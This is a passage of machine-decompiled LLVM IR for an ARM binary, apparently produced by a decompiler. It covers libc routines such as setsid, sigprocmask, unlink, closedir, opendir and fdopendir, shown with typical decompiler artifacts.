  store i32 %v0_1a6ec, i32* @r4, align 4
  %v0_1a6f4 = load i32, i32* @r5, align 4
  %v1_1a6f8 = call i32 @__libc_disable_asynccancel(i32 %v0_1a6f4)
  %v0_1a6fc = load i32, i32* @r4, align 4
  %v2_1a704 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1a704, i32* @r4, align 4
  store i32 %v6_1a690, i32* @r5, align 4
  store i32 %v9_1a690, i32* @r6, align 4
  store i32 %v12_1a690, i32* @r7, align 4
  store i32 %v15_1a690, i32* @r8, align 4
  store i32 %v18_1a690, i32* @sl, align 4
  store i32 %v21_1a690, i32* @lr, align 4
  ret i32 %v0_1a6fc

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a6d0, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a714 = load i32, i32* @r7, align 4
  store i32 %v3_1a714, i32* %stack_var_-8, align 4
  %v0_1a720 = load i32, i32* @r0, align 4
  store i32 %v0_1a720, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a720, -4095
  br i1 %tmp, label %dec_label_pc_1a748, label %dec_label_pc_1a730

dec_label_pc_1a730:                               ; preds = %entry
  %v0_1a734 = call i32 @__aeabi_read_tp()
  %v3_1a738 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a738 = sext i16 %v3_1a738 to i32
  %v0_1a73c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a73c = sub i32 0, %v0_1a73c
  store i32 %v1_1a73c, i32* %r2.global-to-local, align 4
  %v3_1a740 = add i32 %v4_1a738, %v0_1a734
  %v4_1a740 = inttoptr i32 %v3_1a740 to i32*
  store i32 %v1_1a73c, i32* %v4_1a740, align 4
  %v2_1a748.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a748

dec_label_pc_1a748:                               ; preds = %entry, %dec_label_pc_1a730
  %v1_1a74c = phi i32 [ %v0_1a720, %entry ], [ -1, %dec_label_pc_1a730 ]
  %v2_1a748 = phi i32 [ %v3_1a714, %entry ], [ %v2_1a748.pre, %dec_label_pc_1a730 ]
  store i32 %v2_1a748, i32* @r7, align 4
  ret i32 %v1_1a74c

; uselistorder directives
  uselistorder i32 %v0_1a720, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a748, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_1a758 = icmp eq i32* %arg2, null
  br i1 %v2_1a758, label %dec_label_pc_1a79c, label %dec_label_pc_1a76c

dec_label_pc_1a76c:                               ; preds = %entry
  %v2_1a76c = load i32, i32* %arg2, align 4
  %v1_1a770 = icmp slt i32 %v2_1a76c, 0
  br i1 %v1_1a770, label %dec_label_pc_1a784, label %dec_label_pc_1a778

dec_label_pc_1a778:                               ; preds = %dec_label_pc_1a76c
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_1a778 = load i32, i32* %.pre3, align 4
  %v1_1a77c = urem i32 %v3_1a778, 2
  %v2_1a77c = icmp eq i32 %v1_1a77c, 0
  br i1 %v2_1a77c, label %dec_label_pc_1a79c, label %dec_label_pc_1a784

dec_label_pc_1a784:                               ; preds = %dec_label_pc_1a76c, %dec_label_pc_1a778
  %v2_1a784 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_1a784 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_1a79c

dec_label_pc_1a79c:                               ; preds = %dec_label_pc_1a778, %entry, %dec_label_pc_1a784
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_1a7d0, label %dec_label_pc_1a7b8

dec_label_pc_1a7b8:                               ; preds = %dec_label_pc_1a79c
  %v1_1a7bc = sub i32 0, %arg1
  %v3_1a7c0 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a7c0 = sext i16 %v3_1a7c0 to i32
  %v0_1a7c4 = call i32 @__aeabi_read_tp()
  %v3_1a7c8 = add i32 %v4_1a7c0, %v0_1a7c4
  %v4_1a7c8 = inttoptr i32 %v3_1a7c8 to i32*
  store i32 %v1_1a7bc, i32* %v4_1a7c8, align 4
  br label %dec_label_pc_1a7d0

dec_label_pc_1a7d0:                               ; preds = %dec_label_pc_1a79c, %dec_label_pc_1a7b8
  %v1_1a7d8 = phi i32 [ %arg1, %dec_label_pc_1a79c ], [ -1, %dec_label_pc_1a7b8 ]
  ret i32 %v1_1a7d8

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1a7d0, { 1, 0 }
  uselistorder label %dec_label_pc_1a79c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a784, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_1a7e4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_1a7f4 = call i32 @gettimeofday(i32 %v2_1a7e4, i32 0)
  %v2_1a7f8 = load i32, i32* %stack_var_-16, align 4
  %v2_1a7fc = icmp eq i32* %arg1, null
  br i1 %v2_1a7fc, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_1a7f8, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_1a7f8

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a810 = load i32, i32* @r7, align 4
  store i32 %v3_1a810, i32* %stack_var_-8, align 4
  %v0_1a81c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a81c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a81c, -4095
  br i1 %tmp, label %dec_label_pc_1a844, label %dec_label_pc_1a82c

dec_label_pc_1a82c:                               ; preds = %entry
  %v0_1a830 = call i32 @__aeabi_read_tp()
  %v3_1a834 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a834 = sext i16 %v3_1a834 to i32
  %v0_1a838 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a838 = sub i32 0, %v0_1a838
  store i32 %v1_1a838, i32* %r2.global-to-local, align 4
  %v3_1a83c = add i32 %v4_1a834, %v0_1a830
  %v4_1a83c = inttoptr i32 %v3_1a83c to i32*
  store i32 %v1_1a838, i32* %v4_1a83c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a844.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a844

dec_label_pc_1a844:                               ; preds = %entry, %dec_label_pc_1a82c
  %v1_1a848 = phi i32 [ %v0_1a81c, %entry ], [ -1, %dec_label_pc_1a82c ]
  %v2_1a844 = phi i32 [ %v3_1a810, %entry ], [ %v2_1a844.pre, %dec_label_pc_1a82c ]
  store i32 %v2_1a844, i32* @r7, align 4
  ret i32 %v1_1a848

; uselistorder directives
  uselistorder i32 %v0_1a81c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a844, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1a850 = load i32, i32* @r4, align 4
  store i32 %v3_1a850, i32* %stack_var_-24, align 4
  %v9_1a850 = load i32, i32* @r6, align 4
  %v12_1a850 = load i32, i32* @r7, align 4
  %v15_1a850 = load i32, i32* @r8, align 4
  %v18_1a850 = load i32, i32* @lr, align 4
  %v2_1a854 = load i32, i32* %arg1, align 4
  store i32 %v2_1a854, i32* %r3.global-to-local, align 4
  %v3_1a85c = icmp eq i32 %v2_1a854, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r6, align 4
  br i1 %v3_1a85c, label %dec_label_pc_1a870, label %dec_label_pc_1a88c

dec_label_pc_1a870:                               ; preds = %entry
  store i32 71656, i32* %r2.global-to-local, align 4
  %v0_1a874 = call i32 @__aeabi_read_tp()
  %v3_1a878 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a878 = sext i16 %v3_1a878 to i32
  store i32 %v4_1a878, i32* %r2.global-to-local, align 4
  %v0_1a87c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1a87c, i32* %r1.global-to-local, align 4
  %v1_1a880 = add i32 %v0_1a87c, 10
  store i32 %v1_1a880, i32* %r3.global-to-local, align 4
  %v3_1a884 = add i32 %v4_1a878, %v0_1a874
  %v4_1a884 = inttoptr i32 %v3_1a884 to i32*
  store i32 %v1_1a880, i32* %v4_1a884, align 4
  %v0_1a934.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a934

dec_label_pc_1a88c:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_1a890 = add i32 %tmp, 24
  store i32 %v1_1a890, i32* %r2.global-to-local, align 4
  %v4_1a898 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 68) to i32*), align 4
  store i32 %v4_1a898, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_1a8a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1a8a4)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1a8bc = load i32, i32* @r6, align 4
  %v2_1a8bc = add i32 %v0_1a8bc, 16
  %v3_1a8bc = inttoptr i32 %v2_1a8bc to i32*
  %v4_1a8bc = load i32, i32* %v3_1a8bc, align 4
  call void @__pseudo_branch(i32 %v4_1a8bc)
  %v0_1a8c8 = load i32, i32* @r7, align 4
  %v1_1a8c8 = inttoptr i32 %v0_1a8c8 to i32*
  %v2_1a8c8 = load i32, i32* %v1_1a8c8, align 4
  store i32 %v2_1a8c8, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_1a8d8 = load i32, i32* @r8, align 4
  store i32 %v0_1a8d8, i32* %v1_1a8c8, align 4
  %v0_1a8dc = load i32, i32* @r6, align 4
  %v1_1a8dc = load i32, i32* %r3.global-to-local, align 4
  %v2_1a8dc = add i32 %v1_1a8dc, %v0_1a8dc
  %v3_1a8dc = inttoptr i32 %v2_1a8dc to i32*
  %v4_1a8dc = load i32, i32* %v3_1a8dc, align 4
  store i32 ptrtoint (i32* @global_var_1a8e8.441 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a8dc)
  %v0_1a8e8 = load i32, i32* @r7, align 4
  %v1_1a8e8 = add i32 %v0_1a8e8, 12
  %v2_1a8e8 = inttoptr i32 %v1_1a8e8 to i32*
  %v3_1a8e8 = load i32, i32* %v2_1a8e8, align 4
  store i32 %v3_1a8e8, i32* @r0, align 4
  %v0_1a8ec = call i32 @free()
  %v0_1a8f0 = load i32, i32* @r7, align 4
  store i32 %v0_1a8f0, i32* @r0, align 4
  %v0_1a8f4 = call i32 @free()
  %v0_1a8fc = load i32, i32* @r4, align 4
  store i32 %v0_1a8fc, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_1a8fc, -4095
  br i1 %tmp11, label %dec_label_pc_1a930, label %dec_label_pc_1a918

dec_label_pc_1a918:                               ; preds = %dec_label_pc_1a88c
  store i32 71488, i32* %r3.global-to-local, align 4
  %v0_1a91c = call i32 @__aeabi_read_tp()
  %v3_1a920 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a920 = sext i16 %v3_1a920 to i32
  store i32 %v4_1a920, i32* %r3.global-to-local, align 4
  %v0_1a924 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a924 = sub i32 0, %v0_1a924
  store i32 %v1_1a924, i32* %r2.global-to-local, align 4
  %v3_1a928 = add i32 %v4_1a920, %v0_1a91c
  %v4_1a928 = inttoptr i32 %v3_1a928 to i32*
  store i32 %v1_1a924, i32* %v4_1a928, align 4
  %v0_1a92c = load i32, i32* @r8, align 4
  br label %dec_label_pc_1a930

dec_label_pc_1a930:                               ; preds = %dec_label_pc_1a88c, %dec_label_pc_1a918
  %v0_1a930 = phi i32 [ %v0_1a8fc, %dec_label_pc_1a88c ], [ %v0_1a92c, %dec_label_pc_1a918 ]
  store i32 %v0_1a930, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a934

dec_label_pc_1a934:                               ; preds = %dec_label_pc_1a870, %dec_label_pc_1a930
  %v0_1a934 = phi i32 [ %v0_1a934.pre, %dec_label_pc_1a870 ], [ %v0_1a930, %dec_label_pc_1a930 ]
  %v2_1a93c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1a93c, i32* @r4, align 4
  store i32 %v9_1a850, i32* @r6, align 4
  store i32 %v12_1a850, i32* @r7, align 4
  store i32 %v15_1a850, i32* @r8, align 4
  store i32 %v18_1a850, i32* @lr, align 4
  ret i32 %v0_1a934

; uselistorder directives
  uselistorder i32 %v0_1a8fc, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 0, 1, 2, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1a934, { 1, 0 }
  uselistorder label %dec_label_pc_1a930, { 1, 0 }
}

define i32 @function_1a94c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a94c:
  %v0_1a94c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a94c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1a94c
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1a94c, %bb
  %v7_1a95c = phi i32 [ %arg1, %dec_label_pc_1a94c ], [ 0, %bb ]
  ret i32 %v7_1a95c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1a960 = load i32, i32* @r4, align 4
  %v6_1a960 = load i32, i32* @r5, align 4
  %v9_1a960 = load i32, i32* @r6, align 4
  %v12_1a960 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_1a974 = call i32 @malloc(i32 48)
  %v2_1a97c = icmp eq i32 %v1_1a974, 0
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r6, align 4
  br i1 %v2_1a97c, label %bb, label %dec_label_pc_1a98c

bb:                                               ; preds = %entry
  br label %dec_label_pc_1aa18

dec_label_pc_1a98c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a990 = load i32, i32* @r4, align 4
  %v2_1a990 = icmp ugt i32 %v0_1a990, 511
  %v2_1a994 = add i32 %v1_1a974, 4
  %v3_1a994 = inttoptr i32 %v2_1a994 to i32*
  store i32 0, i32* %v3_1a994, align 4
  %v0_1a998 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a998 = add i32 %v1_1a974, 16
  %v3_1a998 = inttoptr i32 %v2_1a998 to i32*
  store i32 %v0_1a998, i32* %v3_1a998, align 4
  %v0_1a99c = load i32, i32* %r3.global-to-local, align 4
  %v2_1a99c = add i32 %v1_1a974, 8
  %v3_1a99c = inttoptr i32 %v2_1a99c to i32*
  store i32 %v0_1a99c, i32* %v3_1a99c, align 4
  br i1 %v2_1a990, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_1a98c
  %v0_1a9a42 = load i32, i32* @r4, align 4
  %v2_1a9a43 = add i32 %v1_1a974, 20
  %v3_1a9a44 = inttoptr i32 %v2_1a9a43 to i32*
  store i32 %v0_1a9a42, i32* %v3_1a9a44, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_1a98c
  %v1_1a9a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a9a0 = add i32 %v1_1a9a0, 512
  store i32 %v2_1a9a0, i32* %r3.global-to-local, align 4
  %v0_1a9a4 = load i32, i32* @r4, align 4
  %v2_1a9a4 = add i32 %v1_1a974, 20
  %v3_1a9a4 = inttoptr i32 %v2_1a9a4 to i32*
  store i32 %v0_1a9a4, i32* %v3_1a9a4, align 4
  %v1_1a9a8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1a9a8, i32* %v3_1a9a4, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_1a974, i32* @r5, align 4
  %v0_1a9b0 = load i32, i32* @r7, align 4
  %v2_1a9b0 = inttoptr i32 %v1_1a974 to i32*
  store i32 %v0_1a9b0, i32* %v2_1a9b0, align 4
  %v0_1a9b4 = load i32, i32* @r5, align 4
  %v1_1a9b4 = add i32 %v0_1a9b4, 20
  %v2_1a9b4 = inttoptr i32 %v1_1a9b4 to i32*
  %v3_1a9b4 = load i32, i32* %v2_1a9b4, align 4
  store i32 %v3_1a9b4, i32* %r1.global-to-local, align 4
  %v2_1a9bc = call i32 @calloc(i32 1, i32 %v3_1a9b4)
  %v2_1a9c0 = icmp eq i32 %v2_1a9bc, 0
  store i32 %v2_1a9bc, i32* @r4, align 4
  %v1_1a9c8 = load i32, i32* @r5, align 4
  %v2_1a9c8 = add i32 %v1_1a9c8, 12
  %v3_1a9c8 = inttoptr i32 %v2_1a9c8 to i32*
  store i32 %v2_1a9bc, i32* %v3_1a9c8, align 4
  br i1 %v2_1a9c0, label %dec_label_pc_1a9d0, label %dec_label_pc_1a9e0

dec_label_pc_1a9d0:                               ; preds = %bb17
  %v0_1a9d0 = load i32, i32* @r5, align 4
  store i32 %v0_1a9d0, i32* @r0, align 4
  %v0_1a9d4 = call i32 @free()
  %v0_1a9d8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1aa18

dec_label_pc_1a9e0:                               ; preds = %bb17
  %v0_1a9e4 = load i32, i32* @r6, align 4
  %v2_1a9e4 = add i32 %v0_1a9e4, -35372
  store i32 %v2_1a9e4, i32* %r3.global-to-local, align 4
  %v1_1a9ec = inttoptr i32 %v2_1a9e4 to i32*
  %v2_1a9ec = load i32, i32* %v1_1a9ec, align 4
  %v3_1a9ec = add i32 %v0_1a9e4, -35368
  %v4_1a9ec = inttoptr i32 %v3_1a9ec to i32*
  %v5_1a9ec = load i32, i32* %v4_1a9ec, align 4
  store i32 %v5_1a9ec, i32* %r1.global-to-local, align 4
  %v6_1a9ec = add i32 %v0_1a9e4, -35364
  %v7_1a9ec = inttoptr i32 %v6_1a9ec to i32*
  %v8_1a9ec = load i32, i32* %v7_1a9ec, align 4
  store i32 %v8_1a9ec, i32* %r2.global-to-local, align 4
  %v9_1a9ec = add i32 %v0_1a9e4, -35360
  %v10_1a9ec = inttoptr i32 %v9_1a9ec to i32*
  %v11_1a9ec = load i32, i32* %v10_1a9ec, align 4
  store i32 %v11_1a9ec, i32* %r3.global-to-local, align 4
  %v12_1a9ec = add i32 %v0_1a9e4, -35356
  %v1_1a9f8 = inttoptr i32 %v12_1a9ec to i32*
  %v2_1a9f8 = load i32, i32* %v1_1a9f8, align 4
  %v3_1a9f8 = add i32 %v0_1a9e4, -35352
  %v4_1a9f8 = inttoptr i32 %v3_1a9f8 to i32*
  %v5_1a9f8 = load i32, i32* %v4_1a9f8, align 4
  store i32 %v2_1a9f8, i32* %stack_var_-32, align 4
  store i32 %v5_1a9ec, i32* %r1.global-to-local, align 4
  store i32 %v8_1a9ec, i32* %r2.global-to-local, align 4
  store i32 %v11_1a9ec, i32* %r3.global-to-local, align 4
  %v0_1aa08 = load i32, i32* @r5, align 4
  %v1_1aa08 = add i32 %v0_1aa08, 24
  %v1_1aa0c = inttoptr i32 %v1_1aa08 to i32*
  store i32 %v2_1a9ec, i32* %v1_1aa0c, align 4
  %v3_1aa0c = add i32 %v0_1aa08, 28
  %v4_1aa0c = inttoptr i32 %v3_1aa0c to i32*
  %v5_1aa0c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1aa0c, i32* %v4_1aa0c, align 4
  %v6_1aa0c = add i32 %v0_1aa08, 32
  %v7_1aa0c = inttoptr i32 %v6_1aa0c to i32*
  %v8_1aa0c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1aa0c, i32* %v7_1aa0c, align 4
  %v9_1aa0c = add i32 %v0_1aa08, 36
  %v10_1aa0c = inttoptr i32 %v9_1aa0c to i32*
  %v11_1aa0c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1aa0c, i32* %v10_1aa0c, align 4
  %v12_1aa0c = add i32 %v0_1aa08, 40
  %v2_1aa10 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_1a9f8, i32* %r1.global-to-local, align 4
  %v1_1aa14 = inttoptr i32 %v12_1aa0c to i32*
  store i32 %v2_1aa10, i32* %v1_1aa14, align 4
  %v3_1aa14 = add i32 %v0_1aa08, 44
  %v4_1aa14 = inttoptr i32 %v3_1aa14 to i32*
  %v5_1aa14 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1aa14, i32* %v4_1aa14, align 4
  %v0_1aa18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1aa18

dec_label_pc_1aa18:                               ; preds = %bb, %dec_label_pc_1a9d0, %dec_label_pc_1a9e0
  %v0_1aa18 = phi i32 [ 0, %bb ], [ %v0_1a9d8, %dec_label_pc_1a9d0 ], [ %v0_1aa18.pre, %dec_label_pc_1a9e0 ]
  store i32 %v3_1a960, i32* @r4, align 4
  store i32 %v6_1a960, i32* @r5, align 4
  store i32 %v9_1a960, i32* @r6, align 4
  store i32 %v12_1a960, i32* @r7, align 4
  ret i32 %v0_1aa18

; uselistorder directives
  uselistorder i32 %v2_1a9bc, { 1, 0, 2 }
  uselistorder i32 %v1_1a974, { 3, 2, 6, 0, 4, 5, 1, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1aa18, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_1aa30 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_1aa38 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_1aa68, label %dec_label_pc_1aa50

dec_label_pc_1aa50:                               ; preds = %entry
  %v0_1aa54 = call i32 @__aeabi_read_tp()
  %v3_1aa58 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1aa58 = sext i16 %v3_1aa58 to i32
  %v0_1aa5c = load i32, i32* %r2.global-to-local, align 4
  %v1_1aa5c = sub i32 0, %v0_1aa5c
  store i32 %v1_1aa5c, i32* %r2.global-to-local, align 4
  %v3_1aa60 = add i32 %v4_1aa58, %v0_1aa54
  %v4_1aa60 = inttoptr i32 %v3_1aa60 to i32*
  store i32 %v1_1aa5c, i32* %v4_1aa60, align 4
  br label %dec_label_pc_1aa8c

dec_label_pc_1aa68:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_1aa68 = icmp slt i32 %arg1, 0
  br i1 %v1_1aa68, label %dec_label_pc_1aa8c, label %dec_label_pc_1aa70

dec_label_pc_1aa70:                               ; preds = %dec_label_pc_1aa68
  store i32 %v2_1aa38, i32* @r1, align 4
  %v0_1aa74 = call i32 @fstat()
  %v1_1aa78 = icmp slt i32 %v0_1aa74, 0
  br i1 %v1_1aa78, label %dec_label_pc_1aa80, label %dec_label_pc_1aa94

dec_label_pc_1aa80:                               ; preds = %dec_label_pc_1aa70
  br label %dec_label_pc_1aa8c

dec_label_pc_1aa8c:                               ; preds = %dec_label_pc_1aa80, %dec_label_pc_1aa68, %dec_label_pc_1aa50
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aad8

dec_label_pc_1aa94:                               ; preds = %dec_label_pc_1aa70
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1aa9c = load i32, i32* @r7, align 4
  %v3_1aaa0 = call i32 @__GI___fcntl_nocancel(i32 %v0_1aa9c, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_1aaa8 = load i32, i32* @r7, align 4
  %v2_1aaac = call i32 @fd_to_DIR(i32 %v0_1aaa8, i32 %tmp)
  store i32 %v2_1aaac, i32* %r1.global-to-local, align 4
  %v2_1aab0 = icmp eq i32 %v2_1aaac, 0
  br i1 %v2_1aab0, label %dec_label_pc_1aab8, label %dec_label_pc_1aad8

dec_label_pc_1aab8:                               ; preds = %dec_label_pc_1aa94
  %v0_1aac8 = call i32 @__aeabi_read_tp()
  %v3_1aacc = load i16, i16* @global_var_2c068.414, align 2
  %v4_1aacc = sext i16 %v3_1aacc to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_1aad4 = add i32 %v4_1aacc, %v0_1aac8
  %v4_1aad4 = inttoptr i32 %v3_1aad4 to i32*
  store i32 12, i32* %v4_1aad4, align 4
  %v0_1aad8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aad8

dec_label_pc_1aad8:                               ; preds = %dec_label_pc_1aa94, %dec_label_pc_1aa8c, %dec_label_pc_1aab8
  %v0_1aad8 = phi i32 [ %v2_1aaac, %dec_label_pc_1aa94 ], [ 0, %dec_label_pc_1aa8c ], [ %v0_1aad8.pre, %dec_label_pc_1aab8 ]
  store i32 %v3_1aa30, i32* @r7, align 4
  ret i32 %v0_1aad8

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1aad8, { 2, 0, 1 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1aae8:
  %v0_1aae8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1aae8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1aae8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1aae8, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_1aaf8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1aaf8, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1ab04 = call i32 @fstat()
  store i32 %v0_1ab04, i32* @r5, align 4
  %v2_1ab08 = icmp eq i32 %v0_1ab04, 0
  br i1 %v2_1ab08, label %dec_label_pc_1ab10, label %dec_label_pc_1ab88

dec_label_pc_1ab10:                               ; preds = %entry
  %v1_1ab14 = and i32 %tmp4, 61440
  store i32 %v1_1ab14, i32* @r3, align 4
  %v7_1ab18 = icmp eq i32 %v1_1ab14, 16384
  br i1 %v7_1ab18, label %dec_label_pc_1ab38, label %dec_label_pc_1ab20

dec_label_pc_1ab20:                               ; preds = %dec_label_pc_1ab10
  %v0_1ab24 = call i32 @__aeabi_read_tp()
  %v3_1ab28 = load i16, i16* @global_var_2c068.414, align 2
  %v0_1ab2c = load i32, i32* @r5, align 4
  store i32 %v0_1ab2c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ab6c

dec_label_pc_1ab38:                               ; preds = %dec_label_pc_1ab10
  %v0_1ab38 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1ab40 = call i32 @__libc_fcntl(i32 %v0_1ab38, i32 3)
  %v7_1ab44 = icmp eq i32 %v2_1ab40, -1
  br i1 %v7_1ab44, label %dec_label_pc_1ab88, label %dec_label_pc_1ab4c

dec_label_pc_1ab4c:                               ; preds = %dec_label_pc_1ab38
  %v1_1ab4c = urem i32 %v2_1ab40, 4
  store i32 %v1_1ab4c, i32* %r3.global-to-local, align 4
  %v7_1ab50 = icmp eq i32 %v1_1ab4c, 1
